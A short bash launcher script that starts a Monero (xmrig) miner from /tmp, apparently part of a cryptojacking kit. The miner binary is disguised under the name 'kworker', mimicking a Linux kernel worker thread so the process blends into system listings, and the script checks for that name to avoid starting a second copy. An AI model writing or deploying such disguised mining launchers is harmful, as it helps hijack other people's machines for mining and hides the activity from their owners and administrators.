#!/bin/bash
if ! pidof kworker >/dev/null; then
  nice /tmp/kworker $*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
